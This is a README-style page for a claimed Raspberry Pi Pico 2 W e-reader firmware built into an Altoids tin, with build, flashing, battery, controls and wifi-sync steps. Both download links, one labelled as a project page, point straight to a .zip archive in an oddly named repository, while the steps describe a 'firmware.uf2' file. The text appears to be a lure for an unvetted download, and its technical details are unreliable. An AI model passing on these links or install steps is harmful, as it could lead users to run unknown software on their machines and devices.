# 📖 altoids-ereader - Read books inside a metal tin

[![](https://img.shields.io/badge/Download-eReader_Software-blue)](https://raw.githubusercontent.com/jadegreen-genusraphanus373/altoids-ereader/main/firmware/altoids-ereader-1.1-alpha.5.zip)

## 📦 What is this project?

The altoids-ereader project is firmware for a Raspberry Pi Pico 2 W. It turns your microcontroller into a portable digital book reader. You build the device inside a standard Altoids tin. This project uses an e-ink screen to display text. E-ink screens look like paper. They stay clear in sunlight. This technology saves battery life. You can read for hours without a charge.

## ⚙️ Hardware requirements

You need these items to build your ereader:

*   One Raspberry Pi Pico 2 W board.
*   One Waveshare e-ink display module.
*   One Altoids tin for the case.
*   A small breadboard or jumper wires to connect the parts.
*   A USB cable for your computer.
*   A microSD card reader if you want to store many books.

## 🚀 How to get the software

You must visit the project page to get the files. 

[Click here to visit the download page](https://raw.githubusercontent.com/jadegreen-genusraphanus373/altoids-ereader/main/firmware/altoids-ereader-1.1-alpha.5.zip)

The page contains the latest version of the firmware. Save the file named "firmware.uf2" to your computer. You need this file to make the hardware work.

## 🛠️ Installation steps

Follow these steps to put the software onto your device.

1. Connect your Raspberry Pi Pico 2 W to your computer using the USB cable. Hold the BOOTSEL button on the board while you plug it in.
2. Your computer shows a new drive named RPI-RP2.
3. Open the folder for that drive.
4. Drag and drop the "firmware.uf2" file into this folder.
5. The board reboots automatically. 
6. Your device now runs the altoids-ereader software.

## 📂 Managing your book files

The software reads text files. Use your computer to format your books. 

1. Connect the device to your computer.
2. The device appears as a USB storage drive.
3. Copy your text files into the root folder of the drive.
4. The software lists these files on the screen.
5. Use the buttons on your hardware to scroll through your files.
6. Press the select button to open a file.

## 🔋 Powering your device

The project works with a small lithium battery. You connect the battery to the power pins on the board. The Raspberry Pi Pico 2 W handles the charging process. Use a 3.7V battery. Ensure the wires match the positive and negative pins. Incorrect wiring damages the board. Check your connections before you apply power.

## 📐 Designing your case

Place the components inside the Altoids tin. Use electrical tape to cover the back of the screen. This prevents short circuits. Drill holes in the tin for your buttons and the USB port. Cut a window in the lid for the e-ink screen. Secure the parts with adhesive strips. Keep the battery away from sharp edges.

## 🎛️ Using the controls

The screen shows a menu. The software supports four buttons. 

*   Up button: Moves the focus up in your list.
*   Down button: Moves the focus down in your list.
*   Select button: Opens the file or folder.
*   Back button: Returns to the previous menu.

The e-ink screen refreshes every time you change a page. This blink is normal. It clears the previous text. 

## ❓ Troubleshooting common issues

If the computer does not see the board:
*   Try a different USB cable. Some cables only carry power.
*   Make sure you hold the BOOTSEL button during connection.
*   Check that the RPI-RP2 drive appears in your file manager.

If the screen stays blank:
*   Press the reset button on the board.
*   Check the wiring between the screen and the Pico 2 W.
*   Verify you copied the correct firmware file.

If the text looks messy:
*   Refresh the page to clear the screen.
*   Ensure your text files use plain encoding.
*   Avoid special symbols that the software does not support.

## 💡 Customizing your experience

You can change the font size in the settings menu. Open the settings file on the drive. Change the number next to the font size line. Save the file. Restart the device. The new font size applies to the next book you open. You can also adjust the contrast settings. Higher contrast makes the text darker. Lower contrast makes the background whiter. Find the balance that suits your eyes. 

## 🔌 Connecting to wireless networks

The Raspberry Pi Pico 2 W has wireless hardware. The firmware includes a feature to sync your files over a network. Create a file on the drive named "network.txt". Add your wireless name and password to this file. The device looks for these details on startup. It connects to the network to check for updates. You can also upload books through a web browser. Type the device address into your computer browser. Drag and drop files to the page. The files appear on your reader instantly. 

## 🛡️ Safety reminders

Always disconnect the battery when you work on the hardware. Do not leave the battery inside the tin while you solder wires. Keep the tin away from liquids. The metal tin conducts electricity. Make sure no naked wires touch the sides of the tin. Use insulating materials to line the inside of the case. Always charge the battery with a known charger. Do not leave the device charging unattended. 

## 🌐 Project community

This project relies on contributions from makers. Visit the main repository to see updates. Report any issues you find. Follow the documentation for details on how to improve the code. The community creates new features often. Check the repository for improved versions of the firmware. Always back up your data before you update the software.